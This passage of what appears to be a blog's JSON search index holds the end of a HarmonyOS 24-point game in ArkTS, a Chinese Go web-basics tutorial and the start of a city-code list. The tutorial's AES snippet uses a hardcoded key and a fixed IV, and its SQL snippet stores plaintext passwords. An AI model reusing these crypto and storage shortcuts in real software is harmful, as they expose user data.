pNumerator / gcdValue // 化简后的分子 let reducedDenominator = qNumerator / gcdValue // 化简后的分母 return `${reducedNumerator}${reducedDenominator !== 1 ? \u0026#39;/\u0026#39; + reducedDenominator : \u0026#39;\u0026#39;}` // 返回化简后的分数形式 } calculateIterativeGcd(a: number, b: number): number { // 使用迭代方式计算两个数的最大公约数 while (b !== 0) { // 当b不为0时继续 let temp = b // 临时保存b b = a % b // 更新b a = temp // 更新a } return a // 返回最大公约数 } } class JudgePointSolution { // 定义JudgePointSolution类，用于寻找24点游戏的解 solutions: string[] = [] // 存储找到的解 accuracyThreshold = Math.pow(10, -6) // 设置精度阈值 operations = [// 定义四种基本运算 (a: number, b: number) =\u0026gt; a + b, // 加法 (a: number, b: number) =\u0026gt; a * b, // 乘法 (a: number, b: number) =\u0026gt; a - b, // 减法 (a: number, b: number) =\u0026gt; a / b,// 除法 ] searchSolutions(currentNumbers: number[], pathExpression: string) { // 查找解的递归方法 if (this.solutions.length \u0026gt; 0) { // 如果已经找到解，则返回 return } if (currentNumbers.length === 1) { // 如果只剩下一个数 if (Math.abs(currentNumbers[0] - 24) \u0026lt; this.accuracyThreshold) { // 如果该数等于24（在阈值范围内） this.solutions.push(pathExpression) // 将路径表达式作为解加入数组 } return // 结束递归 } for (let i = 0; i \u0026lt; currentNumbers.length - 1; i++) { // 对所有数进行两两组合 for (let j = i + 1; j \u0026lt; currentNumbers.length; j++) { // 对所有数进行两两组合 const tempNumbers = this.removeNumberFromArray(currentNumbers, i, j) // 创建新的数组，移除当前两个数 for (let k = 0; k \u0026lt; 4; k++) { // 对四种运算分别尝试 let tempPath = pathExpression.length \u0026gt; 0 ? `${pathExpression}, ` : \u0026#39;\u0026#39; // 格式化路径表达式 tempPath += `(${currentNumbers[i]} ${this.getOperationSymbol(k)} ${currentNumbers[j]})` // 添加当前运算表达式到路径 tempNumbers.push(this.operations[k](currentNumbers[i], currentNumbers[j])) // 计算结果并加入临时数组 this.searchSolutions(tempNumbers, tempPath) // 递归查找解 tempNumbers.pop() // 移除最后一个加入的结果 if (k === 2 || k === 3) { // 如果是减法或除法 let tempPathSwapped = pathExpression.length \u0026gt; 0 ? `${pathExpression}, ` : \u0026#39;\u0026#39; // 格式化路径表达式 tempPathSwapped += `(${currentNumbers[j]} ${this.getOperationSymbol(k)} ${currentNumbers[i]})` // 添加当前运算表达式到路径 tempNumbers.push(this.operations[k](currentNumbers[j], currentNumbers[i])) // 计算结果并加入临时数组 this.searchSolutions(tempNumbers, tempPathSwapped) // 递归查找解 tempNumbers.pop() // 移除最后一个加入的结果 } } } } } find24Solutions(numbers: number[]): string[] { // 查找所有可能的解 this.solutions = [] // 清空解数组 this.searchSolutions(numbers, \u0026#39;\u0026#39;) // 开始查找 return this.solutions // 返回解数组 } getOperationSymbol(index: number): string { // 获取运算符号 const symbols = [\u0026#39;+\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;/\u0026#39;] // 定义符号数组 return symbols[index] // 返回对应的符号 } removeNumberFromArray(array: number[], index1: number, index2: number): number[] { // 从数组中移除指定位置的元素 const newArray: number[] = [] // 新数组 for (let k = 0; k \u0026lt; array.length; k++) { // 遍历原始数组 if (k !== index1 \u0026amp;\u0026amp; k !== index2) { // 如果不是需要移除的位置 newArray.push(array[k]) // 将元素加入新数组 } } return newArray // 返回新数组 } } @Entry @Component struct GameIndex { @State randomNumbers: number[] = [] // 用于存储随机生成的游戏数字 @State symbols: string[] = [\u0026#34;加\u0026#34;, \u0026#34;减\u0026#34;, \u0026#34;乘\u0026#34;, \u0026#34;除\u0026#34;] // 存储游戏中可用的运算符号字符串数组 @State cells: Cell[] = [// 存储游戏中的单元格实例数组 new Cell(0, 0), // 创建位于第0行第0列的单元格 new Cell(0, 1), // 创建位于第0行第1列的单元格 new Cell(1, 0), // 创建位于第1行第0列的单元格 new Cell(1, 1)// 创建位于第1行第1列的单元格 ] @State selectedNumberIndex: number = -1 // 存储选中的数字单元格的索引，默认为-1表示未选择 @State selectedSymbolIndex: number = -1 // 存储选中的运算符号的索引，默认为-1表示未选择 @State showSolution: boolean = false // 控制是否显示游戏的解决方案，默认为不显示 cellWidth: number = 250 // 单个单元格的宽度 cellMargin: number = 15 // 单元格之间的间距 judgePoint24Util: JudgePointSolution = new JudgePointSolution() // 创建一个JudgePointSolution类的实例，用于寻找游戏的解 isShowAnim: boolean = false //单元格是否正在移动，若移动中禁止操作以防闪退 aboutToAppear(): void { this.resetGame() } resetGame() { this.randomNumbers = [] for (let i = 0; i \u0026lt; this.cells.length; i++) { let randomValue = Math.floor(Math.random() * 13) + 1 this.cells[i].setDefaultValue(randomValue) this.randomNumbers.push(randomValue) } this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 this.showSolution = false let solutions = this.judgePoint24Util.find24Solutions(this.randomNumbers) console.info(`【${solutions}】`) if (solutions.length === 0) { console.info(`无解，重新循环`) this.resetGame() } } build() { Column({ space: 20 }) { // 显示/隐藏 解决方案 Text(`${this.judgePoint24Util.find24Solutions(this.randomNumbers)}`) .fontSize(20) .fontColor(Color.White) .backgroundColor(\u0026#34;#ffa101\u0026#34;) .visibility(this.showSolution ? Visibility.Visible : Visibility.Hidden) .padding(10) .borderRadius(10) // 数字 Row() { Flex({ wrap: FlexWrap.Wrap }) { ForEach(this.cells, (cell: Cell, index: number) =\u0026gt; { Text(`${cell.displayValue}`) .fontSize(`${this.cellWidth / 3}lpx`) .width(`${this.cellWidth}lpx`) .height(`${this.cellWidth}lpx`) .fontColor(cell !== this.cells[this.selectedNumberIndex] ? \u0026#34;#ffffff\u0026#34; : \u0026#34;#fe4b00\u0026#34;) .backgroundColor(cell !== this.cells[this.selectedNumberIndex] ? \u0026#34;#ffa101\u0026#34; : \u0026#34;#fddf4b\u0026#34;) .borderRadius(`${this.cellMargin}lpx`) .margin(`${this.cellMargin}lpx`) .textAlign(TextAlign.Center) .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) .visibility(cell.isVisible ? Visibility.Visible : Visibility.Hidden) .translate({ x: `${cell.xPosition}lpx`, y: `${cell.yPosition}lpx` }) .onClick(() =\u0026gt; { if (this.selectedNumberIndex === -1) { this.selectedNumberIndex = index } else if (this.selectedNumberIndex === index) { this.selectedNumberIndex = -1 } else if (this.selectedSymbolIndex === -1) { console.info(`未选择操作符，仅改变选中位置`) this.selectedNumberIndex = index } else { if (this.isShowAnim) { return } this.isShowAnim = true animateToImmediately({ duration: 300, onFinish: () =\u0026gt; { this.cells[this.selectedNumberIndex].xPosition = 0 // 动画结束后位置归0 this.cells[this.selectedNumberIndex].yPosition = 0 // 动画结束后位置归0 this.cells[index].performOperation( this.cells[this.selectedNumberIndex], this.symbols[this.selectedSymbolIndex] ) this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 // 统计结果 let countVisibleCells: number = 0 for (let i = 0; i \u0026lt; this.cells.length; i++) { if (this.cells[i].isVisible) { countVisibleCells++ } } if (countVisibleCells === 1) { // 当前是最后一个 promptAction.showDialog({ title: \u0026#39;游戏结束\u0026#39;, message: `${this.cells[index].value === 24 ? \u0026#39;【胜利】\u0026#39; : \u0026#39;【失败】\u0026#39;}`, buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] }).then(() =\u0026gt; { this.resetGame() }) } this.isShowAnim = false }, }, () =\u0026gt; { let temp = this.cellWidth + this.cellMargin // 要移动的单元格距离 let movingCell: Cell = this.cells[this.selectedNumberIndex] movingCell.xPosition = (cell.columnIndex - movingCell.columnIndex) * temp movingCell.yPosition = (cell.rowIndex - movingCell.rowIndex) * temp }) } }) }) }.width(`${this.cellWidth * 2 + this.cellMargin * 4}lpx`) }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.Center) // 操作符 Row() { Flex({ wrap: FlexWrap.Wrap }) { ForEach(this.symbols, (symbol: string, index: number) =\u0026gt; { Text(`${symbol}`) .fontSize(`${this.cellWidth / 4}lpx`) .width(`${this.cellWidth / 2}lpx`) .height(`${this.cellWidth / 2}lpx`) .fontColor(this.selectedSymbolIndex !== index ? \u0026#34;#c16cf9\u0026#34; : \u0026#34;#fcfeff\u0026#34;) .backgroundColor(this.selectedSymbolIndex !== index ? Color.Transparent : \u0026#34;#c16cf9\u0026#34;) .borderRadius(`${this.cellMargin}lpx`) .margin(`${this.cellMargin / 2}lpx`) .textAlign(TextAlign.Center) .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) .onClick(() =\u0026gt; { if (this.selectedSymbolIndex === index) { this.selectedSymbolIndex = -1 } else { this.selectedSymbolIndex = index } }) }) }.width(`${this.cellWidth * 2 + this.cellMargin * 4}lpx`) }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.Center) // 重新开始 / 解决方案 Row() { Button(\u0026#39;重新开始\u0026#39;).clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }).onClick(() =\u0026gt; { this.resetGame() }) Button(\u0026#39;解决方案\u0026#39;).clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }).onClick(() =\u0026gt; { this.showSolution = !this.showSolution }) }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.SpaceEvenly) } .width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#0d1015\u0026#34;) .padding(20) } } ","permalink":"https://qfsyso.github.io/posts/harmonyos-next-worldtime-whack-mole/","summary":"HarmonyOS Next WorldTime Whack Mole\nHarmonyOS应用 鸿蒙NEXT开发 世界时应用 打地鼠\n环境 Windows 11 DevEco Studio 5.0.1 Release Version: 5.0.5.306 HarmonyOS 5.0.1(13) ArkTS ArkUI API 13\nWorldTime 世界时应用 实现思路 获取时区信息 更新时间 搜索功能\n代码 import { i18n } from \u0026#39;@kit.LocalizationKit\u0026#39; // 导入国际化模块，用于处理多语言 import { inputMethod } from \u0026#39;@kit.IMEKit\u0026#39; // 导入输入法模块 @ObservedV2 // 观察者装饰器，用于观察状态变化 class CityTimeInfo { // 定义城市时间信息类 @Trace cityName: string = \u0026#34;\u0026#34;; // 城市名称，初始为空字符串 @Trace currentTime: string = \u0026#34;\u0026#34;; // 当前时间，初始为空字符串 timeZone: i18n.","title":"HarmonyOS Next WorldTime  Whack Mole"},{"content":"setup windows环境安装 windows环境下，go安装包安装成功后，会自动将go添加到path目录下，所以不需要再向Path环境变量中添加go\nGOROOT设置：Go安装路径\n“我的电脑”=》“属性”=》“高级系统设置”=》“环境变量”=》“系统环境变量”，新增GOROOT环境变量\nweb package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Hello, m requested: %s\\n\u0026#34;, r.URL.Path) }) http.ListenAndServe(\u0026#34;:24612\u0026#34;, nil) } Http Server static\nhttp.HandleFunc(\u0026#34;/\u0026#34;, func (w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Welcome !\u0026#34;) }) fs := http.FileServer(http.Dir(\u0026#34;static/\u0026#34;)) http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, fs)) http.ListenAndServe(\u0026#34;:24612\u0026#34;, nil) gorilla/mux router\ngo get github.com/gorilla/mux package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/gorilla/mux\u0026#34; ) func main() { r := mux.NewRouter() r.HandleFunc(\u0026#34;/books/{title}/page/{page}\u0026#34;, func(w http.ResponseWriter, r *http.Request) { vars := mux.Vars(r) title := vars[\u0026#34;title\u0026#34;] page := vars[\u0026#34;page\u0026#34;] fmt.Fprintf(w, \u0026#34; book: %s on page %s\\n\u0026#34;, title, page) }) http.ListenAndServe(\u0026#34;:24612\u0026#34;, r) } //http://localhost:24612/books/mybook/page/1 sql package main import ( \u0026#34;database/sql\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;time\u0026#34; _ \u0026#34;github.com/go-sql-driver/mysql\u0026#34; ) func main() { db, err := sql.Open(\u0026#34;mysql\u0026#34;, \u0026#34;root:xxx@(119.23.xxx.xxx:123)/TestDB?parseTime=true\u0026#34;) if err != nil { log.Fatal(err) } if err := db.Ping(); err != nil { log.Fatal(err) } // { // Create a new table // query := ` // CREATE TABLE users ( // id INT AUTO_INCREMENT, // username TEXT NOT NULL, // password TEXT NOT NULL, // created_at DATETIME, // PRIMARY KEY (id) // );` // if _, err := db.Exec(query); err != nil { // log.Fatal(err) // } // } { // Insert a new user username := \u0026#34;m24612\u0026#34; password := \u0026#34;secret\u0026#34; createdAt := time.Now() result, err := db.Exec(`INSERT INTO users (username, password, created_at) VALUES (?, ?, ?)`, username, password, createdAt) if err != nil { log.Fatal(err) } id, err := result.LastInsertId() fmt.Println(id) } { // Query a single user var ( id int username string password string createdAt time.Time ) query := \u0026#34;SELECT id, username, password, created_at FROM users WHERE id = ?\u0026#34; if err := db.QueryRow(query, 1).Scan(\u0026amp;id, \u0026amp;username, \u0026amp;password, \u0026amp;createdAt); err != nil { log.Fatal(err) } fmt.Println(id, username, password, createdAt) } { // Query all users type user struct { id int username string password string createdAt time.Time } rows, err := db.Query(`SELECT id, username, password, created_at FROM users`) if err != nil { log.Fatal(err) } defer rows.Close() var users []user for rows.Next() { var u user err := rows.Scan(\u0026amp;u.id, \u0026amp;u.username, \u0026amp;u.password, \u0026amp;u.createdAt) if err != nil { log.Fatal(err) } users = append(users, u) } if err := rows.Err(); err != nil { log.Fatal(err) } fmt.Printf(\u0026#34;%#v\u0026#34;, users) } // { // _, err := db.Exec(`DELETE FROM users WHERE id = ?`, 1) // if err != nil { // log.Fatal(err) // } // } } Template package main import ( \u0026#34;html/template\u0026#34; \u0026#34;net/http\u0026#34; ) type Todo struct { Title string Done bool } type TodoPageData struct { PageTitle string Todos []Todo } func main() { tmpl := template.Must(template.ParseFiles(\u0026#34;layout.html\u0026#34;)) http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { data := TodoPageData{ PageTitle: \u0026#34;My TODO list\u0026#34;, Todos: []Todo{ {Title: \u0026#34;Task 1\u0026#34;, Done: false}, {Title: \u0026#34;Task 2\u0026#34;, Done: true}, {Title: \u0026#34;Task 3\u0026#34;, Done: true}, }, } tmpl.Execute(w, data) }) http.ListenAndServe(\u0026#34;:80\u0026#34;, nil) } html\n\u0026lt;h1\u0026gt;{{.PageTitle}}\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; {{range .Todos}} {{if .Done}} \u0026lt;li class=\u0026#34;done\u0026#34;\u0026gt;{{.Title}}\u0026lt;/li\u0026gt; {{else}} \u0026lt;li\u0026gt;{{.Title}}\u0026lt;/li\u0026gt; {{end}} {{end}} \u0026lt;/ul\u0026gt; static package main import ( \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { // 设置 HTML 文件的路径 htmlFilePath := \u0026#34;static/test.html\u0026#34; // 创建一个 HTTP 处理程序来服务 HTML 文件 http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { // 读取 HTML 文件 data, err := ioutil.ReadFile(htmlFilePath) if err != nil { http.Error(w, \u0026#34;Error reading HTML file\u0026#34;, http.StatusInternalServerError) return } // 将文件内容写入 HTTP 响应 w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html; charset=utf-8\u0026#34;) w.Write(data) }) // 启动 HTTP 服务器并监听端口 8080 log.Println(\u0026#34;Listening on :8080...\u0026#34;) if err := http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil); err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } from package main import ( \u0026#34;html/template\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;fmt\u0026#34; ) type ContactDetails struct { Email string Subject string Message string } func main() { tmpl := template.Must(template.ParseFiles(\u0026#34;temp.html\u0026#34;)) http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { if r.Method != http.MethodPost { tmpl.Execute(w, nil) return } details := ContactDetails{ Email: r.FormValue(\u0026#34;email\u0026#34;), Subject: r.FormValue(\u0026#34;sub\u0026#34;), Message: r.FormValue(\u0026#34;msg\u0026#34;), } fmt.Println(details) fmt.Println(details.Email) // do something with details _ = details tmpl.Execute(w, struct{ Success bool }{true}) }) http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil) } {{if .Success}} \u0026lt;h1\u0026gt; message!\u0026lt;/h1\u0026gt; {{else}} \u0026lt;h1\u0026gt;Contact\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Email:\u0026lt;/label\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;label\u0026gt;Subject:\u0026lt;/label\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;sub\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;label\u0026gt;Message:\u0026lt;/label\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;textarea name=\u0026#34;msg\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; {{end}} HandleFunc // basic-middleware.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; ) func logging(f http.HandlerFunc) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { log.Println(r.URL.Path) f(w, r) } } func foo(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, \u0026#34;www\u0026#34;) } func bar(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, \u0026#34;bbb\u0026#34;) } func main() { http.HandleFunc(\u0026#34;/www\u0026#34;, logging(foo)) http.HandleFunc(\u0026#34;/bbb\u0026#34;, logging(bar)) http.ListenAndServe(\u0026#34;:24614\u0026#34;, nil) } json package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) type User struct { Firstname string `json:\u0026#34;firstname\u0026#34;` Lastname string `json:\u0026#34;lastname\u0026#34;` Age int `json:\u0026#34;age\u0026#34;` } func main() { http.HandleFunc(\u0026#34;/decode\u0026#34;, func(w http.ResponseWriter, r *http.Request) { var user User json.NewDecoder(r.Body).Decode(\u0026amp;user) fmt.Fprintf(w, \u0026#34;%s %s is %d years old!\u0026#34;, user.Firstname, user.Lastname, user.Age) }) http.HandleFunc(\u0026#34;/encode\u0026#34;, func(w http.ResponseWriter, r *http.Request) { peter := User{ Firstname: \u0026#34;m\u0026#34;, Lastname: \u0026#34;s\u0026#34;, Age: 25, } json.NewEncoder(w).Encode(peter) }) http.ListenAndServe(\u0026#34;:24614\u0026#34;, nil) } //{\u0026#34;firstname\u0026#34;:\u0026#34;e\u0026#34;,\u0026#34;lastname\u0026#34;:\u0026#34;m\u0026#34;,\u0026#34;age\u0026#34;:28} //curl -s -XPOST -d\u0026#39;{\u0026#34;firstname\u0026#34;:\u0026#34;e\u0026#34;,\u0026#34;lastname\u0026#34;:\u0026#34;m\u0026#34;,\u0026#34;age\u0026#34;:28}\u0026#39; http://localhost:24614/decode //curl -s http://localhost:8080/encode webapi get package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; ) // 定义与JSON响应相对应的结构体 type APIResponse struct { IsOk bool `json:\u0026#34;isOk\u0026#34;` Code int `json:\u0026#34;code\u0026#34;` Msg string `json:\u0026#34;msg\u0026#34;` RsData interface{} `json:\u0026#34;rsData\u0026#34;` // 如果rsData可能是不同的类型，可以使用interface{} } func main() { // 设置API的URL url :=\u0026#34;https://localhost:32768/api/v10/xxx/rsRsModel2?t1=1\u0026#34; // 发送GET请求 resp, err := http.Get(url) if err != nil { log.Fatal(err) } defer resp.Body.Close() // 确保关闭响应体 // 读取响应体 body, err := ioutil.ReadAll(resp.Body) if err != nil { log.Fatal(err) } // 解析JSON响应 var result APIResponse err = json.Unmarshal(body, \u0026amp;result) if err != nil { log.Fatal(err) } // 打印结果 fmt.Printf(\u0026#34;IsOk: %v\\n\u0026#34;, result.IsOk) fmt.Printf(\u0026#34;Code: %d\\n\u0026#34;, result.Code) fmt.Printf(\u0026#34;Msg: %s\\n\u0026#34;, result.Msg) fmt.Printf(\u0026#34;RsData: %v\\n\u0026#34;, result.RsData) if result.IsOk \u0026amp;\u0026amp; result.Code == 1 { } else { } } websocket package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/gorilla/websocket\u0026#34; ) var upgrader = websocket.Upgrader{ ReadBufferSize: 1024, WriteBufferSize: 1024, } func main() { http.HandleFunc(\u0026#34;/echo\u0026#34;, func(w http.ResponseWriter, r *http.Request) { conn, _ := upgrader.Upgrade(w, r, nil) // error ignored for sake of simplicity for { // Read message from browser msgType, msg, err := conn.ReadMessage() if err != nil { return } // Print the message to the console fmt.Printf(\u0026#34;%s sent: %s\\n\u0026#34;, conn.RemoteAddr(), string(msg)) // Write message back to browser if err = conn.WriteMessage(msgType, msg); err != nil { return } } }) http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { http.ServeFile(w, r, \u0026#34;ws.html\u0026#34;) }) http.ListenAndServe(\u0026#34;:24614\u0026#34;, nil) } \u0026lt;input id=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;send()\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;pre id=\u0026#34;output\u0026#34;\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;script\u0026gt; var input = document.getElementById(\u0026#34;input\u0026#34;); var output = document.getElementById(\u0026#34;output\u0026#34;); var socket = new WebSocket(\u0026#34;ws://localhost:24614/echo\u0026#34;); socket.onopen = function () { output.innerHTML += \u0026#34;Status: Connected\\n\u0026#34;; }; socket.onmessage = function (e) { output.innerHTML += \u0026#34;Server: \u0026#34; + e.data + \u0026#34;\\n\u0026#34;; }; function send() { socket.send(input.value); input.value = \u0026#34;\u0026#34;; } \u0026lt;/script\u0026gt; hash package main import ( \u0026#34;fmt\u0026#34; \u0026#34;golang.org/x/crypto/bcrypt\u0026#34; ) func HashPassword(password string) (string, error) { bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14) return string(bytes), err } func CheckPasswordHash(password, hash string) bool { err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) return err == nil } func main() { password := \u0026#34;musu\u0026#34; hash, _ := HashPassword(password) // ignore error for the sake of simplicity fmt.Println(\u0026#34;Password:\u0026#34;, password) fmt.Println(\u0026#34;Hash: \u0026#34;, hash) match := CheckPasswordHash(password, hash) fmt.Println(\u0026#34;Match: \u0026#34;, match) } aes package main import ( //\t\u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; ) func Encrypt(plainText, key string) (string, error) { block, err := aes.NewCipher([]byte(key)) if err != nil { return \u0026#34;\u0026#34;, err } iv := []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0} cfb := cipher.NewCFBEncrypter(block, iv) ciphertext := make([]byte, len(plainText)) cfb.XORKeyStream(ciphertext, []byte(plainText)) return base64.StdEncoding.EncodeToString(ciphertext), nil } func Decrypt(cipherText, key string) (string, error) { block, err := aes.NewCipher([]byte(key)) if err != nil { return \u0026#34;\u0026#34;, err } decryptedBytes, err := base64.StdEncoding.DecodeString(cipherText) if err != nil { return \u0026#34;\u0026#34;, err } iv := []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0} cfb := cipher.NewCFBDecrypter(block, iv) plaintext := make([]byte, len(decryptedBytes)) cfb.XORKeyStream(plaintext, decryptedBytes) return string(plaintext), nil } func main() { plainText := \u0026#34;mus11test111u\u0026#34; key := \u0026#34;thisisaverysecretkeymusu\u0026#34; // 加密 encrypted, err := Encrypt(plainText, key) if err != nil { fmt.Println(\u0026#34;Encryption failed:\u0026#34;, err) return } fmt.Println(\u0026#34;Encrypted:\u0026#34;, encrypted) //encrypted = \u0026#34;2gAFF\u0026#34; // 解密 decrypted, err := Decrypt(encrypted, key) if err != nil { fmt.Println(\u0026#34;Decryption failed:\u0026#34;, err) return } fmt.Println(\u0026#34;Decrypted:\u0026#34;, decrypted) } gin 有点像express.js\ngo get -u github.com/gin-gonic/gin package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) type User struct { Name string `json:\u0026#34;name\u0026#34;` Age int `json:\u0026#34;age\u0026#34;` } func main() { r := gin.Default() //middleware r.Use(func(c *gin.Context) { fmt.Println(\u0026#34;middleware called\u0026#34;) c.Next() }) r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.String(200, \u0026#34;hello ~ \u0026#34;) }) //router r.GET(\u0026#34;/user/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.String(200, \u0026#34;hi, %s!\u0026#34;, name) }) //static r.Static(\u0026#34;/static\u0026#34;, \u0026#34;./static\u0026#34;) /////http://localhost:24614/user/m //get r.GET(\u0026#34;/users\u0026#34;, func(c *gin.Context) { user := User{Name: \u0026#34;mu\u0026#34;, Age: 15} c.JSON(http.StatusOK, user)//users }) // err r.NoRoute(func(c *gin.Context) { c.JSON(http.StatusNotFound, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Page not found\u0026#34;}) }) r.Run(\u0026#34;:24614\u0026#34;) } docker main.go\n# 使用官方的 Go 运行时作为基础镜像 FROM golang:1.18-alpine as builder # 设置工作目录 WORKDIR /app # 将源代码复制到工作目录 COPY . . # 设置 GOPATH 和 GOBIN（可选） ENV GOPATH=/go ENV PATH=$GOPATH/bin:$PATH # 构建 Go 应用 RUN go build -o app . # 使用 Alpine Linux 作为最终的运行时环境 FROM alpine:latest # 设置工作目录 WORKDIR /app # 将编译好的二进制文件从 builder 阶段复制到最终镜像 COPY --from=builder /app/app /app/app # 给二进制文件添加执行权限 RUN chmod +x /app/app # 暴露应用需要监听的端口 EXPOSE 8080 # 设置容器启动时运行的命令 CMD [\u0026#34;/app/app\u0026#34;] build\ndocker build -t your-image-name . docker run -p 8080:8080 your-image-name http://localhost:8080/ push\ndocker login docker push your-image-name ","permalink":"https://qfsyso.github.io/posts/golang-web-base/","summary":"setup windows环境安装 windows环境下，go安装包安装成功后，会自动将go添加到path目录下，所以不需要再向Path环境变量中添加go\nGOROOT设置：Go安装路径\n“我的电脑”=》“属性”=》“高级系统设置”=》“环境变量”=》“系统环境变量”，新增GOROOT环境变量\nweb package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Hello, m requested: %s\\n\u0026#34;, r.URL.Path) }) http.ListenAndServe(\u0026#34;:24612\u0026#34;, nil) } Http Server static\nhttp.HandleFunc(\u0026#34;/\u0026#34;, func (w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Welcome !\u0026#34;) }) fs := http.FileServer(http.Dir(\u0026#34;static/\u0026#34;)) http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, fs)) http.ListenAndServe(\u0026#34;:24612\u0026#34;, nil) gorilla/mux router\ngo get github.com/gorilla/mux package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/gorilla/mux\u0026#34; ) func main() { r := mux.","title":"Golang Web Base"},{"content":"这是一段json\n[ { \u0026#34;id\u0026#34;: 1, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101010100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;北京\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;100000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;010\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:06\u0026#34; }, { \u0026#34;id\u0026#34;: 2, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;安徽\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 3, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;福建\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 4, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;甘肃\u0026#34;, \u0026#34;post_code\u0026#34;: null, 